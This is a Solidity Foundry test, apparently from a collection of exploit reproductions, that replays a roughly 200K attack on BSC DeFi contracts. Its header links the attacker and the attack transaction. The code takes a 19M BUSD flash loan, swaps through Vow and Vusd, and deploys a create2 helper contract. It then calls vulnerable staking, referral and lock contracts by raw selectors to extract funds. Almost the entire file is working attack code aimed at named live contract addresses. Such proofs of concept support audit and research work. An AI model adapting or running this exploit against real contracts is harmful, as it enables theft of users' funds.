// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ～200K
// TX : https://app.blocksec.com/explorer/tx/bsc/0x1350cc72865420ba5d3c27234fd4665ad25c021b0a75ba03bc8340a1b1f98a45
// Attacker : https://bscscan.com/address/0x6951eb8a4a1dab360f2230fb654551335d560ec0
// Attack Contract : https://bscscan.com/address/0xbdfbb387fbf20379c016998ac609871c3357d749
// GUY : https://x.com/EXVULSEC/status/1796499069583724638

interface Imoney {
    function stakes() external;
    function Send() external;
}

contract ContractTest is Test {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x72dCf845AE36401e82e681B0E063d0703bAC0Bba); 
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Vow = IERC20(0xF585B5b4f22816BAf7629AEA55B701662630397b);
    IERC20 Vusd = IERC20(0xc0D8DaA6516BaB4eFCe440860987E735BaB44160);
    IERC20 TLN = IERC20(0xf7d142a354322C7560250CaA0e2a06c89649e4C2);
    address Tlnswap=(0x19B3F588BdC9a6f9ecb8255919B02F9ADF053363);
    address VulnContract=0x028c911C10c9E346158206991E02D09Bd0A8A35b;
    address VulnContract_2=0x85F82230883693f1Bbff65be1f7663EE5F0AA5f8;
    uint256 constant PRECISION = 10**18;

    function setUp() external {
        vm.createSelectFork("bsc", 39198657);
        deal(address(WBNB), address(this), 2 ether);
        deal(address(BUSD), address(this), 0);
    }

    function testExploit() external {

        emit log_named_decimal_uint("[Begin] Attacker BUSD before exploit", BUSD.balanceOf(address(this)), 18);

        Pool.flash(address(this),19000000 ether,0,"0x123");

        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker Vow after exploit", Vow.balanceOf(address(this)), 18);

    }

    // function attack() internal {
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {

        //Step 1  
        //Tx:https://app.blocksec.com/explorer/0x8d27f9a15b1834e5f9e55d47ec32d01e7fe54f93cfc6ea9d4e8c5fbe72756897
        swap_token_to_tokens(address(WBNB),address(BUSD),address(Vow),2 ether);
        swap_token_to_token(address(Vow),address(Vusd),854320785746786696066);
        Vusd.approve(address(Router),2000000 ether);
        Vow.approve(address(Router),2000000 ether);
        Router.addLiquidity(address(Vow),address(Vusd),854320785746786696066,1182464186867710570390,0,0,address(this),block.timestamp+500);
        address HelperExploitContract=create_contract(1);
        //function join(address R e) public 
        address(VulnContract).call(abi.encodeWithSelector(bytes4(0x28ffe6c8), address(HelperExploitContract)));



        //Step 2
        swap_token_to_token(address(BUSD),address(Vow),19000000 ether);

        Pair.transfer(address(HelperExploitContract),1 ether);

        Imoney(HelperExploitContract).stakes();
        
        Pair.approve(address(VulnContract_2),type(uint256).max);

        //stake()
        address(VulnContract_2).call(abi.encodeWithSelector(bytes4(0xa694fc3a), 942253377026177767815));

        Imoney(HelperExploitContract).Send();

        Vow.approve(address(Tlnswap),type(uint256).max);
        TLN.approve(address(Tlnswap),type(uint256).max);

       //function lock(uint256 amount) external(Use function selector)
        address(Tlnswap).call(abi.encodeWithSelector(bytes4(0xdd467064), 3199510344301177871795565));

        swap_token_to_token(address(Vusd),address(Vow),3199510 ether);
        swap_token_to_token(address(Vow),address(BUSD),800000 ether);

        BUSD.transfer(msg.sender, 19000000 * 1e18 + fee0);

    }

    function swap_token_to_tokens(address a,address b,address c,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](3);
        path[0] = address(a);
        path[1] = address(b);
        path[2] =  address(c);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    function getbalance() public {
        emit log_named_decimal_uint("this token balance", Vow.balanceOf(address(this)), Vow.decimals());
    }
       function getreserves(uint256 stepNum) public {
        console.log("Step %i", stepNum);
        (uint256 reserveIn, uint256 reserveOut,) = Pair.getReserves();
        emit log_named_decimal_uint("ReserveIn", reserveIn, 1);
        emit log_named_decimal_uint("ReserveOut", reserveOut, 18);
    }
    function cal_address(uint256 time) internal returns(address){
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }
    function create_contract(uint256 times) internal returns(address) {
        uint256 i = 0;
        while(i<times){
            bytes memory bytecode = type(Money).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to Send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i ++;
            return hack_contract;

        }
    }
function receive() public payable {}
}
contract Money is Test{
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x72dCf845AE36401e82e681B0E063d0703bAC0Bba); 
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 TLN = IERC20(0xf7d142a354322C7560250CaA0e2a06c89649e4C2);
    address VulnContract=0x028c911C10c9E346158206991E02D09Bd0A8A35b;
    address VulnContract_2=0x85F82230883693f1Bbff65be1f7663EE5F0AA5f8;
    address Referer=0xEB1Df3Bed5bd20c010CAAd4EE18Ff7A697334E68;
    uint256 constant PRECISION = 10**18;
    address owner;
    constructor() {
        owner = msg.sender;
        address(VulnContract).call(abi.encodeWithSelector(bytes4(0x60410fbb),1));
        address(VulnContract).call(abi.encodeWithSelector(bytes4(0x28ffe6c8), address(Referer)));
    }

    function stakes()external {
        require(owner==msg.sender,"error");
        Pair.approve(address(VulnContract_2),type(uint256).max);
        //stake
        address(VulnContract_2).call(abi.encodeWithSelector(bytes4(0xa694fc3a), 1 ether));
    }

    function Send()public {
        require(owner==msg.sender,"error");
        TLN.transfer(address(msg.sender),TLN.balanceOf(address(this)));
    }
    fallback() external payable {}
}